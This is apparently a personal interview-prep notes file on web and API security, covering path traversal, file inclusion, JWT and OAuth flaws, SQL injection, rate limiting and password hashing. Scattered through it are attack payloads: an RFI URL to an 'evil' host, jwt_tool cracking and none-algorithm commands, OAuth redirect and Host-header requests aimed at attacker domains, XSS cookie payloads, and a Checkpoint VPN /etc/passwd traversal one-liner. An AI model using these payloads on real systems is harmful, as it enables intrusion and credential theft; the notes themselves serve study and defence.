# For__Reference

>Difference btw IDOR and privilege escalation:

Both these come under broken access control .

privilege escalation focuses on gaining higher-level permissions within a system, 
while IDOR targets the manipulation of references to objects in an application to access unauthorized data.

> difference between soap and rest api

Soap uses a structured data format and uses only XML data format.

Rest supports different data formats.

Security:

Public APIs have lower security requirements and demand greater flexibility so anyone can interact with them. So, REST is a better choice when you build public APIs. 

Conversely, some private APIs for internal enterprise requirements (like data reporting for compliance) may benefit from the tighter security measures in WS-Security of SOAP.

REST is not restricted to XML and its the choice of implementer which Media-Type to use like XML, JSON, Plain-text. Moreover, REST can use SOAP protocol but SOAP cannot use REST.

>Difference between LFI and directory traversal

path traversal:

path traversal is also known as directory traversal.

../ and backtracking is a security vulnerability that is found in web applications that can allow an attacker to read arbitrary files on the server where the app is hosted.

Attackers can exploit this vulnerability to gain unauthorised access to sensitive files on the server, incuding source code , credentials for back end systems.Ultimately this could result in a complete system compromise.

This vulnerability occurs when web apps do not properly vaildate user input to contsruct  file paths to access files.Malicious actors can take advantage of this vulnerability by manipulating user input to traverse directories outside of the intended directory.

$document = $_GET['doc'];
$filepath = "/var/www/html/documents/".$document;

if (file_exists($filepath)) {

    readfile($filepath);
    
} else {
    
    echo "File not found";

}

This code is vulnerable to path traversal attacks as it concatenates the user-supplied input ($document) to the file path without proper validation. An attacker can easily exploit this vulnerability by supplying a payload such as “../../../../etc/passwd”, which allows them to traverse up the directory hierarchy and access sensitive files on the server. The application should implement proper input validations and access control checks to prevent path traversal attacks.

File Inclusion Vulnerability
---------------------------------

File inclusion vulnerability is another type of vulnerability that allows an attacker to read and execute arbitrary files on the server where the application is  hosted.
This vulnerability occurs when an application uses a variable that the attacker can manipulate to construct a file path to include the file during runtime. As a result, the attacker can take over the entire server by executing a malicious file under their control.

There are two types of File Inclusion vulnerabilities: Local File Inclusion (LFI) and Remote File Inclusion (RFI).

Local File Inclusion (LFI):
An attacker can use this vuln to include files that are stored on the same server as the vuln web app.

Here, an attacker can leverage this vulnerability to include sensitive files, including configuration files, system files, or other files containing credentials or sensitive data.

> Disclosing a local file inclusion vulnerability in xmlhttprequest library

![image](https://github.com/pravalika7k/Interview/assets/163530288/cdf4b65a-b641-4f57-98e0-621daff9d676)



Remote File Inclusion (RFI):

In RFI, an attacker can include any arbitrary file  from a remote location and execute code on the target server.

Here, an attacker can leverage this vulnerability to execute malicious code, install malware, or gain unauthorized access to the server.

For example, an attacker could create a URL such as “http://example.com/page.php?page=../../etc/passwd" to include the `/etc/passwd` file, which contains sensitive information about the system. Alternatively, they could include a malicious file to gain complete control of the system with a crafted URL like http://example.com/page.php?page=../../malicious.php.Restricting the queries to only specific directory by hardcoding it over the code.Blaclist special chars like ../, ? etc and also it's url encoded formats. Revoke the user session when you come across the requests that are having ../

Keywod: Defense in depth, least privilege principle

security through obscruity - hiding confidential from attacker known in an place that he would not find that.

the key differences between the two and how to differentiate them:
------------------------

Nature of vulnerability: Path traversal vulnerability allows an attacker to read files and directories outside of the intended directory. On the other hand, file inclusion vulnerability allows an attacker to include or, say, execute and read arbitrary files from a remote or local server.

Impact on server: A path traversal vulnerability can allow an attacker to access sensitive files and directories on the server, which can lead to data theft, server takeover, or other malicious actions. A file inclusion vulnerability can allow an attacker to execute an arbitrary file on the server, leading to complete server compromise, data theft, or other malicious actions.

Severity of vulnerability: Both path traversal and file inclusion vulnerabilities can be severe, depending on the specific implementation and the impact on the server. However, file inclusion vulnerabilities are generally considered more severe because they allow remote code execution.

Cause of vulnerability: Both path traversal and file inclusion vulnerabilities can be caused by poor input validation or sanitization and a lack of proper access controls. Path traversal vulnerabilities occur when the application fails to validate user input used to access the file system, while file inclusion vulnerabilities occur when user input is used to include files from a remote or local server without proper validation.


http: //localhost/index.php? page = http: //someevilhost.com/test.php


### prototype pollution

proto_ = payload(anything could be xss etc)

need to add this in application developer/debugger cosnole.

prototype pollution is a vulnerability that enables threat actors to exploit javascript runtimes.

Threat actors inject properties into existing javascript construct prototypes, attempting to compromise the application.

This vulnerability is called prototype pollution because it allows threat actors to inject values that overwrite or pollute the “prototype” of a base object. This malicious prototype can pass to many other objects that inherit that prototype. Once threat actors can control the default values of the object’s properties, they can tamper with the application’s logic. This can lead to denial of service (DoS) or remote code execution (RCE).

JavaScript can run on the client-side and server-side of a web application, which is why prototype pollution vulnerabilities may exist on both sides. As a result, prototype attacks can vary greatly in scope and damage, depending on the application logic and implementation.

Client-side exploitation of a prototype pollution vulnerability can result in several attacks, such as cross-site scripting (XSS) attacks. In this case, threat actors look for a gadget that relies on the property of an object susceptible to pollution. If the object interacts with the page’s document object model (DOM), threat actors can trigger client-side JavaScript code execution.

### Authentication Bearer Token

Bearer token is used for both authentication and authorisation purposes.

Authorisation: Bearer <token>

This request header will be present across all http request.

Bearer keywork is added to every token mnadatorily.

Actual token will be present in <token> field.

They are commonly used with OAuth 2.0 protocol and other token based authenticated systems.

When a user/client submits credentials to the server , server generates a token upon validation of credentials. This token serves as a proof of authentication and is used to access protected resources on a web server.

"Bearer" keyword easily identifies the type of authentication token and server can apply the correct validation and authorised logic.

Bearer tokens do not hold any information besides the token itself, such as user identity or any specific user permissions.

Hence, server needs to store user information in the database and associate it with the token.

The downside of this approach is that db access is required every time the token is used.

### JWT Bearer Token

JWT Bearer, also known as Json Web Tokens used as a web token.

JWT contains user information in the form of JSON objects and user level permissions are also present in it.

It consists of three parts. body, payload and sigature.

Body and Payload are base 64 encoded and can be decoded by user to view user authentication information and it's permissions.

This means that server need not to store user information making it more efficient and scalable solution for authentication and authorisation purposes.

JWT can be symmetric or asymmetric based on the encryption used.

symmetric - are the same secret key for signing and verifying the token.

Assymetric -- uses a public/private key pair to sign and verify the token. Due to this , shared secret sharing is not required as in case of symmetric making it more secure in scenarios where secure key exchange is a challenge.

In summary, symmetric JWTs are faster and simpler to implement, but require secure sharing of the secret key, while asymmetric JWTs are more secure but slower and more complex to implement.

JWTs consist of three parts:

Header: contains type of token and algorithm that is used for signing.

Payload: contains user's identity, roles and permissions.

signature: it is used to verify the authenticity of the token and ensure that it is not tampered with.

jwt_tool :
------------

There is a tool called jwt_tool in kali linux which checks the data that is present in jwt.

To check and modify the data:

https://jwt.io/

1. Simple command to crack JWT password:

# jwt_tool <JWT_Token> -C -d passwordList.txt

jwt_tool eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6Ik11c2FiIEFsaGFyYW55Iiwicm9sZSI6InVzZXIiLCJpYXQiOjE2ODc3MjI4NDl9.X3tG7w5QvFJ5eIetPnG8ECyM4l2E7pBcC_j9iZWY7Qg -C -d /usr/share/wordlists/rockyou.txt

![image](https://github.com/pravalika7k/Interview/assets/163530288/0c30ccd2-3a69-4977-8c76-5103f55a9930)

2. Null signature attack:

   try to delete the signature part

   eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6Ik11c2FiIEFsaGFyYW55Iiwicm9sZSI6InVzZXIiLCJpYXQiOjE2ODc3MjI4NDl9.

   Command:

$ jwt_tool <JWT_Token> -X n

3- None Attack

try to set the algorithm header field to “none”, then encode the header using base64-encoding, and delete the signature part then send it to the server. If you lucky this will lead to bypassing the signature check, so you didn’t need to crack the password.

$ jwt_tool <JWT_Token> -X a

$ jwt_tool eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6Ik11c2FiIEFsaGFyYW55Iiwicm9sZSI6InVzZXIiLCJpYXQiOjE2ODc3MjI4NDl9.X3tG7w5QvFJ5eIetPnG8ECyM4l2E7pBcC_j9iZWY7Qg -X a

![image](https://github.com/pravalika7k/Interview/assets/163530288/8a855448-f3dd-49ef-be13-1e7e2aae8f7e)



### OAuth2

OAUTH 2 is a complete rewrite of OAuth1.

It's not backward compatible with OAuth1.

OAuth2 is considered to be a more modern and flexible protocol, while OAuth1 is more secure but also more complex to implement.

OAuth2 is a powerful authorisation protocol that allows third party application to access a user's resources (data/profile) on another application (google, facebook, github), without the need for the user to share or store their login credentials. Single sign on is a mechanism that allows users to authenticate once and gain access to multiple applications without having to enter the credentials again.

First step is my app have to be registered in that third party application. Secondly, user have to give the grand authorization to access his data. After that, third party app will give my app a token to access data. Finally, my app can access the third party’s user data via token and display in my app.

let’s say a user wants to use a third-party calendar application to access their Google Calendar. The user would log in to their organization’s SSO provider and then navigate to the calendar application. The application would request authorization to access the user’s Google Calendar using OAuth2, and the user would grant permission. The application would then be able to access the user’s calendar without the user having to enter their Google credentials.

![image](https://github.com/pravalika7k/Interview/assets/163530288/564c920e-1a60-439f-b341-51949a4f8183)

![image](https://github.com/pravalika7k/Interview/assets/163530288/8a0880fc-9877-485b-8bca-3e7ed2bc1a84)

How to identify oauth authentication:

/authorisation

client_id - ID from a registration process

redirect_uri - uri of the client application

response-type - server expects to receive an authorisation code

how does vulnerabilities in oauth arise:
-------

1. oauth specification is vague

2. required security settings are marked optional and not enabled by default.

3. very few built-in security features. developers needs to add them - like input validation

CSRF + OAUth
------------

state parameter is a like hash random string which is a csrf token. This acts as a defense against csrf attacks, however implemetation of this token for an app is optional,making it vulnerable as security features are not enabled by default.

If we come across a request with /authorisation and no state token in the url, then csrf attack can be performed on oauth request.

![image](https://github.com/pravalika7k/Interview/assets/163530288/3a44eaaf-28ac-47ab-807e-994d4a3052bf)

Tokens:
----------

Access token:

1. short-lived(few hours or minutes)
2. cannot be revoked, can be timed out.
3. if an attacker gets hold of our access token, cannot revoke this token and this token gets only expired after time out. there is a risk with this token.

Refresh token:

1. long-lived (months or years)
2. used to get new access token
3. can be revoked

 The access token discussed earlier represents the authorization of a specific application to access specific parts of a user’s data. Access tokens must be kept confidential in transit and in storage.

 Oauth comes into picture where an app can let you access its data without providing its credentials rather it chooses to provide a auth token.

 ![image](https://github.com/pravalika7k/Interview/assets/163530288/4437d632-ae7e-42ca-a66b-ec6a9102e0b1)

![image](https://github.com/pravalika7k/Interview/assets/163530288/95d551a8-03f5-4be4-88f7-fb46edaac2d7)

Major problem with Oauth1:
---------------

Issue was application used to generate a secret and store it on the app server.If it's a web app, as user/attacker doesn't have access to source code and they might not get hold of the secret key.

But in case of mobile apps, attackers/users do have access to source code of the app and can extract secrets.

OAuth2:
----

nullifies the needs for a client secret because of the additional key-exchange added to OAuth, PKCE.

PKCE - proof-key for code exchange

![image](https://github.com/pravalika7k/Interview/assets/163530288/5b5705b3-8f38-492f-a399-435127d1940a)

All the process mentioned in the above screenshot is taken care of by AppAuth.io library.

In OAuth authentication mechanism, access token could be bearer token or a jwt token.

JWT token is mostly used in API authentication.

Treat the jwt header as untrusted external information.Never let the jwt header to determine what signing algoritthm is being used.Instead server should validate the jwt tokens using the signing methods that you know and were expecting.

OAuth Phishing Attack:
-----------

![image](https://github.com/pravalika7k/Interview/assets/163530288/ecc6ff9a-73a6-4057-b150-a3d1f4a35f2f)

This is a OAUth phishing link which looks legitimate but looking deeper into it you'll find anomalies.

Why does google docs requires access to your contacts?

why does granting of external permission is required, when google/gmail can access all it's other components without the grant permission.

upon clicking on the arrow mark beside google docs:

![image](https://github.com/pravalika7k/Interview/assets/163530288/0e03c7ac-b31f-49d7-9ca3-b3f0c5eb4276)

Here, we can see that url will be sent to a malicious/suspicious site. you can avoid this attack by simply clicking on deny instead of allow.

An attacker can start an OAuth flow if victim allows it.

If victim falls for the trap and clicks on the allow button, attacker can get access to the contacts and email address book. Attacker will use google api's to send emails
to everyone and that email is not a fake email. It's coming from a valid gmail account and even google spam filters cannot flag it.

Phishing email looks like:

![image](https://github.com/pravalika7k/Interview/assets/163530288/aef26854-3786-430e-ac6a-8d4d8c4ddc26)

Then other victims will click the button present in that email and it will take you to google not a phishing site.Again a prompt will appear just like in step 1 asking for granting permission.IF the victim clicks on allow,then one more victim is added to the worm chain and this chain continues to spread across organisation.

![image](https://github.com/pravalika7k/Interview/assets/163530288/c277340c-5ac0-4931-913d-6a84e6cafa14)

github OAuth phishing link:

![image](https://github.com/pravalika7k/Interview/assets/163530288/55e8f2e6-361e-408f-a32c-5a2826b7bda2)

Note: keep clean security boundaries even for internal applications.

OAuth Flow
-----------

1. Authorisation code grant
2. Implicit code grant

1. Authorisation grant type

![image](https://github.com/pravalika7k/Interview/assets/163530288/b4ce3fda-737d-4ccd-9c84-17f36a4d41c4)

This is the oauth request requesting the access token.

observe the host as oauth2.googleapis.com. In the body of the request, you can see code, client_id,client_type and grant type being passed. upon sending this request, a access token is received in the response from the authorisation server.

![image](https://github.com/pravalika7k/Interview/assets/163530288/dc762f48-536d-49a8-b6da-71df61b13721)

access token will be sent only if client_id,client_secret and auth_code are present.Just if an attacker gets hold of auth code, access token won't be sent as a response.

2. Implicit code grant

Instead of sending the authorisation code grant, it directly sends the access token grant to the client aplication. Then client application makes a api call to get the data.
Then user data is sent from Oauth service.

![image](https://github.com/pravalika7k/Interview/assets/163530288/11a234b9-96e3-4eac-9705-2c5405ffc085)

Implicit grant types are most suited to single-page applications and native desktop apps which cannot easily store the client_secret on the backend.

If there is no safe way to use the client secret, it's better to opt for implicit code grant.

This should generally happen as server to server internal calls and not be exposed at client side.

>burp setting to hide urls or requests of .jpg,.png to only focus on meaningful requests.

![image](https://github.com/pravalika7k/Interview/assets/163530288/379391c6-daa8-420c-a424-12db13241cdc)

portswigger lab for oauth implicit bypass:

![image](https://github.com/pravalika7k/Interview/assets/163530288/e4432076-2db9-4c58-b535-c44c2be260da)

change the email parameter from wiener to carlos so as to access carlos data without having the knowledge of the password.

If the application doesn't check if the email and token are valid against each other at the server level, then we can access carlos account.

![image](https://github.com/pravalika7k/Interview/assets/163530288/ffe54dc4-a793-4022-9951-fee867c84672)

![image](https://github.com/pravalika7k/Interview/assets/163530288/963eab2e-67c3-4ead-8766-8ccefd246a41)

![image](https://github.com/pravalika7k/Interview/assets/163530288/63fc92c3-a538-4380-8640-2c3b9b9a4615)

Here, server gave access to carlos data assuming that the access token was generated for carlos.

Issue 2: Open Redirection at redirect_uri parameter

When there is no server side validation of the redirect url after getting the token there can be a possibility of a url redirection. At a worst case scenario the tokens can be passed to that particutlar malicious website.

## code

POST /api/auth?response_type=code&redirect_uri=http%3A%2F%2Fvictimtoattacker.com%2Fapi%2Fauth%2Fcallback&state=OCoU2LvhmzLGAZ03DW235QNs&client_id%242thg230df4b8d7b81c2683fd3 HTTP/1.1
Host: victim.com
Connection: close
Referer: https://victim.com/cabinet/
Cookie: <redacted>
{"mailingConsent":false, "accessToken":"<redacted>"}

Issue 3: Host header injection at access token request.

Although quite uncommon it is sometimes good to test if the host is being validated at the server side or not while carrying the access token. If it is not then there is a possibilty to redirect the token to malicious host via host header injection.

For example consider the following original request,

## code

GET /api/twitter/login?csrf=<redacted> HTTP/1.1 
Host: attacker.com/victim.org
Referer: https://www.victim.org/
Cookie:<redacted>

Issue 4: Reusability of an Oauth access token (another common bug)

Sometimes there are cases where an Ouath token previously used does not expire with an immediate effect post logout of the account. In such cases there is a possiblility to login with the previous Oauth token i.e; replace the new Oauth access token with the old one and continue to the application. This should not be the case and is considered as a very bad practice.



> MITM (Man-in-the-middle) attack leads to Data Interception,Integrity violation and impersonation

### Name API Vulnerabilities 5

1. Injection Attack

   ![image](https://github.com/pravalika7k/Interview/assets/163530288/48204a79-d2fc-48ac-9441-ac5544247dca)

Hackers sneak malicious data into API endpoints to potentially steal data or alter it.

https://accounts.com?custid=1' OR 1=1#

2. Dos/DDos Attacks

   A flood of API Calls overwhelms the system making it unusable for legitimate users.

   An attacker can perform HTTP GET Flood on the server using bots or automated attacks.

   ![image](https://github.com/pravalika7k/Interview/assets/163530288/ee02adab-4b24-4382-ac81-8f894e8ff810)


4. Authentication Hijacking

   An attacker steals or manipulates the session token to impersonate them and access unauthorised data.

   ![image](https://github.com/pravalika7k/Interview/assets/163530288/9c9fa990-d999-4066-a1ef-ff234c4348c6)

    similar to session hijacking in web app testcases.

5. Data Exposure

   APIs leak sensitive information through vulnerabilities putting user's privacy at risk.

6. Parameter Tampering

   Attackers manipulate API request parameters to gain unauthorised access to data or steal it.

7. Man in the middle attacks

    Attacker intercepts the communication between you and server to steal data or inject malware.

Having input validation as a defense against sql attack eliminates to some ratio, where an attacker can try to perform Dos attack. If WAF is present , then there is a high chance that Dos could be blocked by WAF based on the abnormal/flooding of requests. The other testcase that an attacker can try is injection malware,trojan etc. this can be prevented by EDR,XDR as they detect such threats.

> Note: By getting service account access to the apps usually breaches are happening like solarwinds, dropbox etc. Service accounts and other servers/services needs to be deployed on different network. Network segmentation comes into play where it can help in reducing the attack surface by limiting it to the affective service/server.

### Recent Attacks / Zero days

Checkpoint VPN Zero Day
-----------

Checkpoint vpn path traversal vulnerability:

It's easy to exploit(remote & unauthenticated), and we know that vpn servers are internet exposed.

Using path traversal vulnerability an attacker can read files present on the server. For example, attacker can read shadow file that contains user accounts hashed passwords.

Shodan shows approx 20k checkpoint vpn servers exposed to the internet.

Here's the quick one-liner that can be used to check if your checkpoint vpn server is vulnerable:

curl -k -s https/HOST/clients/MyCRL -X POST -d "aCSHELL/../../../../../../../etc/passwd" | grep -q "root" && echo "vulnerable" || echo "not vulnerable"

It is advised to patch the server to the latest version and also rotate the passwords.

Password Rotation
--------------

password rotation refers to changing or resetting the passwords.

Limiting the life span of attacks reduces the vulnerabilties to password based attacks and exploits, by condensing the window of time during which the stolen password might be active.

SQL Injection Remediation
-----------------

Use of parameterised queries or prepared statements which will create placeholders for user input to be inserted into the sql query.

General queries doesn't sanitise the user input and directly concatenate it with the sql query, you create a template with placeholders for values to insert. These placeholders act like variables and you pass the actual user input seperately as parameters when you execute the query.

This way the database server knows which parts of the query are data and which part of the query as commands preventing any malicious code from sneaking in.

you can create sql command object with parameterised query string like:

SELECT * from table where username = @username and password = @password

then you add paramters to command object specifying the parameter name and corresponding user input value.

Finally you execute the query with command objects, this way even if a user tries to inject malicious code it's just treated as another data value preventing my harm to your database. 

Input validation and sanitization also must be present making sure to confirm if the given input is in the expected format and type.you can use built-in functions and regular expressions to enforce these rules and reject any input that looks suspicious.

In-bank sql injection is something where an attacker uses the same communication channel to launch the attack.

Inferential sql Injection is also known as blind sql injection where an attacker sends a blind sql payload to the server and observes the response to infer the structure of database.

out-of-band injection is less common where the attacker uses different channels to perform the attack and retrieve data often relying on features enabled on the db server.


429 status code
-------------

HTTP/2 429 Too Many Requests

One of the most common weakness present in APIs is lack of rate limiting.

![image](https://github.com/pravalika7k/Interview/assets/163530288/8a1af9bb-a7d2-45af-b104-ffcec68e540b)

While it doesn't seem much, proper implementation of rate limiting can drastically reduce the impact of attacks that involve:

1. user information gathering
2. brute force/password guessing
3. Data Exfiltration
4. Denial of service
5. Email/SMS spamming
6. Increased billing costs

A well defined rate limiting policy not only helps limiting the impact of other vulnerabilities, but it also buys you time to detect when a vulnerability is actively exploited and stop the data leakage before it's too late.

 I don't think 100% coverage should be the objective. There are endpoints that only return the current API version or the health status which are very unlikely to be affected by this.

The challenging parts are: 

1) prioritize which endpoints would be most affected as a result of no rate limitation (i.e: registration, login, payments, file upload/download, PII, etc.)

2) Define a threshold such that it does not become a nuisance for regular users, but it's low enough to limit exploitation

The HTTP 429 Too Many Requests response status code indicates the user has sent too many requests in a given amount of time ("rate limiting").

A Retry-After header might be included to this response indicating how long to wait before making a new request.

# If client is storing data of the app/user on the client machine, what do you suggest hashing or encryption?

If client is storing passwords, then hashing of passwords is the best solution here.

Again very slow and computer intensive hashing algorithms are to be used for hashing the passwords because if algorithm is fast brute force attacks becomes easier.

However, it is advised to not store the passwords or it's hashes unless it's envitable.

Bcrypt, argon2 and scrypt are the most commonly used algorithms  following the current trends and they are slow hashing algorithm having inherently salting present in them.

If client is not storing passwords, then encryption of data is suggested here as it needs to be retrieved in cleartext whenever client requires it. Confidentiality and integrity of data is in place when it comes to encryption. You can use computer intensive encryption algorithms whether it could be symmetric or assymetric. Morever, security of the data will be in your hands by the way you're implementing the keys for encyption.

MD5, SHA1 and SHA256 are the most commonly used in previous years for hashing purposes. However these algorithms are very fast and not suggested due to that reason. Also, MD5 and SHA1 are not secure to use for password hashes as these algorithms are vulnerable to collision attacks.

Slow computation:

Unlike general hashing algorithms, which prioritize fast computation, password hashing algorithms should be intentionally slow to compute. This characteristic makes it more time-consuming and resource-intensive for attackers to perform brute-force attacks or attempt to guess passwords using a large number of inputs.

Reference:

[1] https://medium.com/@mpreziuso/password-hashing-pbkdf2-scrypt-bcrypt-and-argon2-e25aaf41598e


>XSS Payloads

<script>alert(1)</script>

<sCrIpT>alert(document.cookie)</sCrIpT>

<img src = x onerror= alert(document.cookie)>

<img src = x onerror=prompt(1)>

if space is not allowed:

<img/src/onerror=prompt(8)>

<img onmouseover="alert('xss')">

<img src=# onmouseover="alert('xss')">

<a onmouseover=alert(document.cookie)>xxs link</a>

# CSRF POC without the need of manual intervention for clicking submit attack

![image](https://github.com/pravalika7k/Interview/assets/163530288/6530b37d-8433-47b3-b497-258c7602f2a0)

![image](https://github.com/pravalika7k/Interview/assets/163530288/08b78c20-4334-4147-8eef-0e8faeb7177d)


NSApp Transport Security
------------------------

NSApp Transport security acts as a hsts header for IOS apps.

Session Puzzling Attack
------------------------

watch:

https://youtu.be/-DackF8HsIE?si=WJz26B2yguMSr7L8

This mostly occurs at reset password endpoint where upon validating the username/email for reset password, username gets stored over the session variable thus creating a session token for that user. Now you'll open another tab for accessing a internal page of the app which only authenticated user can access.

As session token is generated earlier during session variable generation and that session token will be stored by the browser when sent from the server.

when the internal page is requested without actually doing authentication, the saved session token is being used here and internal page of the app will be viewed.

Here we were able to bypass the authentication schema by session puzzling attack.

Remediation:

Instead of storing the username in session variable, name it as authenticated and tag it to that specific user session ID.

Reference:

[1] https://medium.com/@maheshlsingh8412/session-puzzling-attack-bypassing-authentication-29f4ff2fd4f5


CSV or Formula Injection:
---------------

Ref:

[1]: https://medium.com/@vulnerable19/csv-injection-d1507ff859cf

Shared preferences in Android
---------------------

One of the most Interesting Data Storage options Android provides its users is Shared Preferences. Shared Preferences is the way in which one can store and retrieve small amounts of primitive data as key/value pairs to a file on the device storage such as String, int, float, Boolean that make up your preferences in an XML file inside the app on the device storage. Shared Preferences can be thought of as a dictionary or a key/value pair. For example, you might have a key being “username” and for the value, you might store the user’s username. And then you could retrieve that by its key (here username). You can have a simple shared preference API that you can use to store preferences and pull them back as and when needed. The shared Preferences class provides APIs for reading, writing, and managing this data.

A SharedPreferences object points to a file containing key-value pairs and provides simple methods to read and write them. Each SharedPreferences file is managed by the framework and can be private or shared.

Read:

https://shadabahmedansari06.medium.com/insecure-storage-shared-preference-3bde5995f459


